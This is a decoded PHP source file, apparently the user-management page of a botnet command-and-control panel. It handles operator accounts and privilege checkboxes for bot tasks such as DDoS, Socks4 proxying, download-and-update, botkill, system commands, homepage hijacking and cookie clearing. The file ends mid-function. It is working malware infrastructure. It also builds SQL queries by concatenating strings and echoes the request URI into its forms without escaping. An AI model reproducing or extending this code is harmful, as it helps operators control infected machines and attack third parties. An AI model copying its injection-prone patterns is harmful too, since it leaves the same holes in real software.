<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "  \t";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
define("MOD_SUSERS_ERROR_NO_ERROR", 0);
define("MOD_SUSERS_ERROR_SQL", 1);
define("MOD_SUSERS_ERROR_ACCESS_DENIED", 2);
define("MOD_SUSERS_ERROR_INVALID_NEW_PASS", 3);
define("MOD_SUSERS_ERROR_INVALID_PARAMS", 4);
define("MOD_SUSERS_ERROR_MASK_UPDATE_FAILED", 5);
define("MOD_SUSERS_ERROR_DELETE_USER_FAILED", 6);
define("MOD_SUSERS_ERROR_BAD_NEW_USERNAME", 7);
define("MOD_SUSERS_ERROR_ADD_USER_FAILED", 8);
define("MOD_SUSERS_ERROR_BAD_NEW_PRIVS", 9);
define("MOD_SUSERS_ERROR_CANNOT_DELETE_SELF", 10);
define("MOD_SUSERS_NOTICE_ERROR_USER_UPDATE_FAILED", 98);
define("MOD_SUSERS_NOTICE_USER_UPDATED", 99);
define("MOD_SUSERS_NOTICE_USER_ADDED", 100);
define("MOD_SUSERS_NOTICE_USER_DELETED", 101);
$mod_priv_only_self = true;
$mod_error = (int) MOD_SUSERS_ERROR_NO_ERROR;
$mod_err_notice = (int) MOD_SUSERS_ERROR_NO_ERROR;
$mod_ok_notice = (int) MOD_SUSERS_ERROR_NO_ERROR;
$sqlAdmins = new CPanelAdmins();
$sqlAdmins->SetInternalLink($main_sql_link);
$my_privs = $Session->Get(SESSION_INFO_PRIVILEGE_MASK);
$view_minimum_stats_value = "";
$no_charts_value = "";
if ($my_privs & USER_PRIVILEGES_CREATE_USERS) {
    $mod_priv_only_self = false;
}
if (isset($_POST["myaccount"])) {
    $mod_priv_only_self = true;
}
if (isset($_POST["new_username"]) && $mod_priv_only_self == false) {
    $new_usern = $_POST["new_username"];
    if ($sqlAdmins->IsUsernameOK($new_usern) == false) {
        $mod_err_notice = (int) MOD_SUSERS_ERROR_BAD_NEW_USERNAME;
    } else {
        if (isset($_POST["newpass_1"]) && isset($_POST["newpass_2"]) && strlen($_POST["newpass_1"]) && strlen($_POST["newpass_2"])) {
            if (strcmp($_POST["newpass_1"], $_POST["newpass_2"]) != 0 || strlen($_POST["newpass_1"]) == 0) {
                $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_NEW_PASS;
            } else {
                $newpass = $_POST["newpass_1"];
                $new_privs = _obfuscated_0D1621380C3017070D193B2E172A3E043F260D3C150F22_();
                if ($new_privs == 0) {
                    $mod_err_notice = (int) MOD_SUSERS_ERROR_BAD_NEW_PRIVS;
                } else {
                    if ($sqlAdmins->IsPasswordOK($newpass) == false) {
                        $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_NEW_PASS;
                    } else {
                        if (strstr($newpass, "'") || strstr($newpass, "\"") || strstr($newpass, "<")) {
                            $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_PARAMS;
                        } else {
                            if ($sqlAdmins->AddUser($new_usern, $newpass, $new_privs, 0)) {
                                $mod_ok_notice = (int) MOD_SUSERS_NOTICE_USER_ADDED;
                            } else {
                                $mod_err_notice = (int) MOD_SUSERS_ERROR_ADD_USER_FAILED;
                            }
                        }
                    }
                }
            }
        } else {
            $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_NEW_PASS;
        }
    }
} else {
    if (isset($_POST["save_new"]) || isset($_POST["delete_user"])) {
        if ((int) $_POST["targetu"] != (int) $Session->Get(SESSION_INFO_USERID) && $mod_priv_only_self == true) {
            $mod_err_notice = (int) MOD_SUSERS_ERROR_ACCESS_DENIED;
        } else {
            $uid = (int) $_POST["targetu"];
            if (is_numeric($uid) == false) {
                $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_PARAMS;
            } else {
                if (isset($_POST["delete_user"])) {
                    if ($mod_priv_only_self == true) {
                        $mod_err_notice = (int) MOD_SUSERS_ERROR_ACCESS_DENIED;
                    } else {
                        if ($uid == $Session->Get(SESSION_INFO_USERID)) {
                            $mod_err_notice = (int) MOD_SUSERS_ERROR_CANNOT_DELETE_SELF;
                        } else {
                            if (!$sqlAdmins->DeleteUserById($uid)) {
                                $mod_err_notice = (int) MOD_SUSERS_ERROR_DELETE_USER_FAILED;
                            } else {
                                $mod_ok_notice = (int) MOD_SUSERS_NOTICE_USER_DELETED;
                            }
                        }
                    }
                } else {
                    if (isset($_POST["newpass_1"]) && isset($_POST["newpass_2"]) && strlen($_POST["newpass_1"]) && strlen($_POST["newpass_2"])) {
                        if (strcmp($_POST["newpass_1"], $_POST["newpass_2"]) != 0 || strlen($_POST["newpass_1"]) == 0) {
                            $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_NEW_PASS;
                        } else {
                            $newpass = $_POST["newpass_1"];
                            if (strstr($newpass, "'") || strstr($newpass, "\"") || strstr($newpass, "<")) {
                                $mod_err_notice = (int) MOD_SUSERS_ERROR_INVALID_PARAMS;
                            } else {
                                if ($sqlAdmins->IsPasswordOK($newpass) == false) {
                                    $mod_err_notice = MOD_SUSERS_ERROR_INVALID_NEW_PASS;
                                } else {
                                    $newpass_hash = $sqlAdmins->HashPasswordWithSalt($newpass);
                                    if ($sqlAdmins->Query("UPDATE " . SQL_DATABASE . ".admins SET password_hash = '" . $newpass_hash . "' WHERE id = '" . $uid . "' LIMIT 1")) {
                                        $mod_ok_notice = (int) MOD_SUSERS_NOTICE_USER_UPDATED;
                                    } else {
                                        $mod_err_notice = (int) MOD_SUSERS_ERROR_SQL;
                                    }
                                }
                            }
                        }
                    }
                }
                if ($mod_priv_only_self == false && $mod_err_notice == MOD_SUSERS_ERROR_NO_ERROR && !isset($_POST["delete_user"])) {
                    $new_priv_mask_ex = _obfuscated_0D1621380C3017070D193B2E172A3E043F260D3C150F22_();
                    if ($new_priv_mask_ex == 0) {
                        $mod_err_notice = MOD_SUSERS_ERROR_BAD_NEW_PRIVS;
                    } else {
                        if (!$sqlAdmins->Query("UPDATE " . SQL_DATABASE . ".admins SET priv_mask = '" . $new_priv_mask_ex . "' WHERE id = '" . $uid . "' LIMIT 1")) {
                            $mod_err_notice = MOD_SUSERS_ERROR_MASK_UPDATE_FAILED;
                        }
                    }
                }
                if ($mod_err_notice == MOD_SUSERS_ERROR_NO_ERROR && !isset($_POST["delete_user"])) {
                    $mod_ok_notice = MOD_SUSERS_NOTICE_USER_UPDATED;
                    global $sqlSettings;
                    global $main_sql_link;
                    global $Session;
                    $elogs = new CLogs();
                    $elogs->SetInternalLink($main_sql_link);
                    $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_USER_MODIFIED, "User record updated (UserID: " . $uid . ")");
                }
            }
        }
    }
}
if (isset($_POST["myaccount"]) && $my_privs & USER_PRIVILEGES_CREATE_USERS) {
    $mod_priv_only_self = false;
}
if ($mod_priv_only_self == false) {
    $all_users = $sqlAdmins->GetUsers();
} else {
    $all_users = $sqlAdmins->GetUserByName($Session->Get(SESSION_INFO_USERNAME));
}
if (!$all_users) {
    $mod_error = MOD_SUSERS_ERROR_SQL;
}
if ($my_privs & USER_PRIVILEGES_CREATE_USERS) {
    _obfuscated_0D0A3030103205143B180F0631173D2915263927292C22_(-1, "", true, USER_PRIVILEGES_ALL);
}
echo "<br /><br /><br />";
$iCount = 0;
if ($mod_error != MOD_SUSERS_ERROR_NO_ERROR) {
    $err_msg = "Undefined error.";
    if ($mod_error == MOD_SUSERS_ERROR_SQL) {
        $err_msg = "An unknown SQL error occured.";
    } else {
        if ($mod_error == MOD_SUSERS_ERROR_ACCESS_DENIED) {
            $err_msg = "You do not have the proper permissions to view this page.";
        }
    }
    echo "&nbsp;&nbsp;&nbsp;";
    echo "<font color=\"#E80000\">" . $err_msg . "</font><br /><br />\r\n";
} else {
    if ($mod_ok_notice != MOD_SUSERS_ERROR_NO_ERROR) {
        $ok_notice = "";
        if ($mod_ok_notice == MOD_SUSERS_NOTICE_USER_UPDATED) {
            $ok_notice = "User information updated!";
        } else {
            if ($mod_ok_notice == MOD_SUSERS_NOTICE_USER_ADDED) {
                $ok_notice = "New user created!";
            } else {
                if ($mod_ok_notice == MOD_SUSERS_NOTICE_USER_DELETED) {
                    $ok_notice = "User successfully deleted.";
                }
            }
        }
        if (strlen($ok_notice)) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, $ok_notice, true, 800);
        }
    } else {
        if ($mod_err_notice != MOD_SUSERS_ERROR_NO_ERROR) {
            $err_notice = "An unknown error occured.";
            if ($mod_err_notice == MOD_SUSERS_ERROR_SQL) {
                $err_notice = "An unknown SQL error occured and the previous action could not be completed. Please try again.";
            } else {
                if ($mod_err_notice == MOD_SUSERS_ERROR_INVALID_NEW_PASS) {
                    $err_notice = "The two passwords you provided either did not match, or were too short. Please try again.";
                } else {
                    if ($mod_err_notice == MOD_SUSERS_ERROR_INVALID_PARAMS) {
                        $err_notice = "Invalid parameters specified for the update form. Stop fucking around.";
                    } else {
                        if ($mod_err_notice == MOD_SUSERS_NOTICE_ERROR_USER_UPDATE_FAILED) {
                            $err_notice = "User information update failed due to an unknown error. Please try again.";
                        } else {
                            if ($mod_err_notice == MOD_SUSERS_ERROR_MASK_UPDATE_FAILED) {
                                $err_notice = "Failed to update user privileges. Please try again.";
                            } else {
                                if ($mod_err_notice == MOD_SUSERS_ERROR_DELETE_USER_FAILED) {
                                    $err_notice = "Failed to delete the specified user. Please try again.";
                                } else {
                                    if ($mod_err_notice == MOD_SUSERS_ERROR_ACCESS_DENIED) {
                                        $err_notice = "You tried to perform a restricted operation. Request denied.";
                                    } else {
                                        if ($mod_err_notice == MOD_SUSERS_ERROR_ADD_USER_FAILED) {
                                            $err_notice = "Failed to create new user. Please try again.";
                                        } else {
                                            if ($mod_err_notice == MOD_SUSERS_ERROR_BAD_NEW_USERNAME) {
                                                $err_notice = "The username you provided for new user is NULL or invalid. Please only use alphanumeric characters and try again.";
                                            } else {
                                                if ($mod_err_notice == MOD_SUSERS_ERROR_BAD_NEW_PRIVS) {
                                                    $err_notice = "Invalid privileges specified. You must specify at least 1 privilege, or delete the user if you do not want to set any privileges.";
                                                } else {
                                                    if ($mod_err_notice == MOD_SUSERS_ERROR_CANNOT_DELETE_SELF) {
                                                        $err_notice = "You cannot delete your own account.";
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (strlen($err_notice)) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $err_notice, true, 800);
            }
        }
    }
    if ($sqlAdmins->NumRows($all_users) == 0) {
        echo "&nbsp;&nbsp;&nbsp;<i>No users found</i><br /><br />\r\n";
    } else {
        while ($current_row = mysql_fetch_assoc($all_users)) {
            if (strlen($current_row["username"])) {
                _obfuscated_0D0A3030103205143B180F0631173D2915263927292C22_($current_row["id"], $current_row["username"], false, $current_row["priv_mask"]);
            }
        }
        mysql_data_seek($all_users, 0);
        echo "<div class=\"tabbable\">\n  <ul class=\"nav nav-tabs\">\n    <li class=\"active\"><a href=\"#pane1\" data-toggle=\"tab\">Users Management</a></li>\n    <li><a href=\"#pane2\" data-toggle=\"tab\">Change My Password</a></li>\n  </ul>\n  <div class=\"tab-content\">\n    <div id=\"pane1\" class=\"tab-pane active\">\n\t\t\t<table class=\"table-bordered\" cellpadding=\"5\" valign=\"top\" align=\"left\" width=\"800\">\n\t\t\t\t\t<thead>\n\t\t\t\t\t  <tr>\n\t\t\t\t\t\t<th width=\"85\" align=\"left\">User ID</th>\n\t\t\t\t\t\t<th width=\"120\" align=\"left\">Username</th>\n\t\t\t\t\t\t<th width=\"150\" align=\"left\">Last login date/time</th>\n\t\t\t\t\t\t<th width=\"75\" align=\"left\">Options</th>\n\t\t\t\t\t  </tr>\n\t\t\t\t\t</thead>\n\t\t\t\t\t<tbody>\n\t";
        if ($my_privs & USER_PRIVILEGES_CREATE_USERS) {
            echo "<tr><td><a data-toggle=\"modal\" href=\"#newuser\">Create New User</a></td><td></td><td></td><td></td></tr>";
        }
        $my_userid = $Session->Get(SESSION_INFO_USERID);
        while ($current_row = mysql_fetch_assoc($all_users)) {
            if (strlen($current_row["username"])) {
                $time_str = $current_row["lastlogin"] != 0 ? date("m/d/Y g:i:s A", $current_row["lastlogin"]) : "Never logged in";
                $row_i_username = $current_row["username"];
                $row_i_id = $current_row["id"];
                $uname_pre = "";
                $uname_post = "";
                if ($row_i_id == $my_userid) {
                    $row_i_username = "<strong>" . @htmlspecialchars($row_i_username) . "</strong>";
                }
                echo "<tr>";
                echo "<td>" . $row_i_id . "</td>";
                echo "<td>" . $row_i_username . "</td>";
                echo "<td>" . $time_str . "</td>";
                echo "<td><a data-toggle=\"modal\" href=\"#" . $row_i_id . "modify\">Edit User</a></td>";
                echo "</tr>";
                $iCount++;
            }
        }
        echo "\t\t\t\t\t</tbody>\n\t\t\t</table>\n\t\t\t</div>\n\t\t\t<div id=\"pane2\" class=\"tab-pane\">\n\t\t\t\t<form class=\"userinfo\" style=\"display:inline;\" method=\"post\" action=\"";
        echo $_SERVER["REQUEST_URI"];
        echo "\">\n\t\t\t\t\n\t\t\t\tPassword (Minimum of 5 characters, maximum of 24 characters)<br />\n\t\t\t\t<input type=\"text\" name=\"newpass_1\" class=\"span3\" value=\"\">\n\t\t\t\t<br />Retype Password<br />\n\t\t\t\t<input type=\"text\" name=\"newpass_2\" class=\"span3\" value=\"\">\n\t\t\t\t<input type=\"hidden\" name=\"myaccount\" value=\"me\">\n\t\t\t\t<input type=\"hidden\" name=\"targetu\" value=\"";
        echo $Session->Get(SESSION_INFO_USERID);
        echo "\">\n\t\t\t\t\n\t\t\t\t<br />\n\t\t\t\t<input type=\"submit\" name=\"save_new\" class=\"btn\" value=\"Save changes\">\n\t\t\t\t</form>\n\t\t\t</div>\n\t\t</div>\n";
    }
}
function _obfuscated_0D1621380C3017070D193B2E172A3E043F260D3C150F22_()
{
    $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ = 0;
    if (isset($_POST["checkbox_priv_createnew"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CREATE_USERS;
    }
    if (isset($_POST["checkbox_priv_tasks"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CREATE_TASKS;
    }
    if (isset($_POST["checkbox_priv_view_extended"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_VIEW_BOT_INFO;
    }
    if (isset($_POST["checkbox_priv_view_logs"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_VIEW_LOGS;
    }
    if (isset($_POST["checkbox_priv_edit_settings"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_EDIT_SETTINGS;
    }
    if (isset($_POST["checkbox_priv_manage_notices"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_MANAGE_NOTICES;
    }
    if (isset($_POST["checkbox_priv_delete_task"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_DELETE_TASK;
    }
    if (isset($_POST["checkbox_priv_edit_task"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_EDIT_TASK;
    }
    if (isset($_POST["checkbox_priv_manage_plugins"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_MANAGE_PLUGINS;
    }
    if (isset($_POST["checkbox_priv_cmd_download"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_DOWNLOAD;
    }
    if (isset($_POST["checkbox_priv_cmd_update"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_UPDATE;
    }
    if (isset($_POST["checkbox_priv_cmd_ddos"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_DDOS;
    }
    if (isset($_POST["checkbox_priv_cmd_view_url"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_VIEW_URL;
    }
    if (isset($_POST["checkbox_priv_cmd_botkill"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_BOTKILL;
    }
    if (isset($_POST["checkbox_priv_cmd_socks"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_SOCKS;
    }
    if (isset($_POST["checkbox_priv_cmd_homepage"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_HOMEPAGE;
    }
    if (isset($_POST["checkbox_priv_cmd_clear_cookies"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_CLEAR_COOKIES;
    }
    if (isset($_POST["checkbox_priv_cmd_system"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_SYSTEM;
    }
    if (isset($_POST["checkbox_priv_cmd_uninstall"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_UNINSTALL;
    }
    if (isset($_POST["checkbox_priv_cmd_terminate"])) {
        $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_ |= USER_PRIVILEGES_CMD_TERMINATE;
    }
    return $_obfuscated_0D0D2126132A383413284033310C025B250809291D3332_;
}
function _obfuscated_0D0A3030103205143B180F0631173D2915263927292C22_($targetuserid = -1, $targetusername, $is_new_user_modal = false, $privs)
{
    if ($targetuserid < 0 && $is_new_user_modal == false) {
        return NULL;
    }
    global $my_privs;
    $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
    $_obfuscated_0D3B302D15161C342204391F120717013D070A1D0B2932_ = $targetuserid . "modify";
    $_obfuscated_0D09133F3E231D090B075C0C0F1B19115B29281C332A22_ = "Modify user '" . @htmlspecialchars($targetusername) . "'";
    if ($is_new_user_modal == true) {
        $_obfuscated_0D3B302D15161C342204391F120717013D070A1D0B2932_ = "newuser";
        $_obfuscated_0D09133F3E231D090B075C0C0F1B19115B29281C332A22_ = "Create New User ...";
    }
    echo "<div class=\"container\">";
    echo "<div id=\"" . $_obfuscated_0D3B302D15161C342204391F120717013D070A1D0B2932_ . "\" class=\"modal hide fade in\" style=\"display: none; \">";
    echo "<div class=\"modal-header\"><a class=\"close\" data-dismiss=\"modal\">x</a>";
    echo "<h3><center>" . $_obfuscated_0D09133F3E231D090B075C0C0F1B19115B29281C332A22_ . "</center></h3>";
    echo "</div><div class=\"modal-body\"><table class=\"table-condensed\" align=\"left\"><tr><td>";
    echo "<form class=\"userinfo\" style=\"display:inline;\" method=\"post\" action=\"" . $_SERVER["REQUEST_URI"] . "\">";
    if ($is_new_user_modal == true) {
        echo "<strong>Username</strong><br /><input type=\"text\" name=\"new_username\" class=\"span3\" value=\"\"><br />";
    }
    echo "<strong>Password (Minimum of 5 characters, maximum of 24 characters)</strong><br /><input type=\"text\" name=\"newpass_1\" class=\"span3\" value=\"\"><br /><strong>Retype Password</strong><br /><input type=\"text\" name=\"newpass_2\" class=\"span3\" value=\"\">";
    if ($my_privs & USER_PRIVILEGES_CREATE_USERS) {
        echo "<br /><br /><br /><strong>User privileges</strong><br /><br /><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CREATE_USERS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_createnew\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Create / Edit / View users</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CREATE_TASKS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_tasks\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Create / View client tasks</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_VIEW_BOT_INFO) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_view_extended\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "View extended bot information</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_VIEW_LOGS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_view_logs\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "View logs</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_EDIT_SETTINGS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_edit_settings\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Edit panel settings</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_MANAGE_NOTICES) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_manage_notices\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Manage panel notices</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_MANAGE_PLUGINS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_manage_plugins\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Manage plugins</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_DELETE_TASK) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_delete_task\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Delete task entries</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_EDIT_TASK) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_edit_task\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Edit task entries</label><br /><strong>Task permissions</strong><br /><br /><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_DOWNLOAD) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_download\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Download task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_UPDATE) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_update\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Update task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_DDOS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_ddos\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "DDoS task(s)</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_BOTKILL) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_botkill\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Botkill task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_SOCKS) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_socks\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Socks4 task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_VIEW_URL) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_view_url\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "View URL task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_HOMEPAGE) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_homepage\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Set homepage task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_CLEAR_COOKIES) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_clear_cookies\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "Clear cookies task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_SYSTEM) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "";
        }
        echo "<input type=\"checkbox\" name=\"checkbox_priv_cmd_system\" value=\"ok\" style=\"position: relative; top: -1px\" " . $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ . ">";
        echo "System task</label><label class=\"checkbox\" style=\"font-size: 11px; face: font-family: Tahoma\">";
        if ($privs & USER_PRIVILEGES_CMD_UNINSTALL) {
            $_obfuscated_0D0E132F5B0F28093B041C38400412165B032321050A11_ = "checked";
        } else {
